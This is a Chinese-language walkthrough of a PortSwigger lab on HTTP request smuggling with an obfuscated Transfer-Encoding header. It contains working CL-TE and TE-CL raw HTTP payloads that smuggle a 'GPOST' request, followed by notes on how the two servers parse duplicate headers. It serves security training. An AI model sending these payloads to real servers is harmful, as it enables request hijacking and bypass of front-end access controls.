# 实验：HTTP 请求走私，混淆 TE 头

本实验涉及一个前端服务器和一个后端服务器，两台服务器以不同方式处理重复的 HTTP 请求头。前端服务器会拒绝不使用 GET 或 POST 方法的请求。

要解决本实验，需要向后端服务器走私一个请求，使得后端服务器处理的下一个请求看起来使用的是 `GPOST` 方法。

> **注意：** 尽管本实验支持 HTTP/2，但预期解决方案需要仅能在 HTTP/1 中实现的技术。您可以在 Burp Repeater 中通过 **Inspector** 面板的 **Request attributes** 部分手动切换协议。

> **提示：** 在请求走私攻击中手动修正长度字段可能比较棘手。我们的 [HTTP Request Smuggler](https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn#demo) Burp 扩展就是为此而设计的。您可以通过 BApp 商店安装它。

## 步骤

探测
- 访问首页
    ```http
    GET / HTTP/2
    Host: id.web-security-academy.net
    ```

各种测试后发现重复 TE 头部存在解析差异，CL-TE 与 TE-CL 均可成功
- CL-TE
    ```http
    Transfer-Encoding: x
    Transfer-Encoding: chunked
    Content-Length: 26

    0

    GPOST / HTTP/1.1
    X: 
    ```

- TE-CL
    ```http
    Transfer-Encoding: chunked
    Transfer-Encoding: x
    Content-Length: 4

    2e
    GPOST / HTTP/1.1
    Content-Length: 14

    body: 
    0


    ```

- 分析
    - 前端解析到重复头部
        - 或无视后使用 CL
        - 或取第一个无效 TE 头部后使用 CL
    
    - 后端解析到重复头部
        - 使用第二个头部
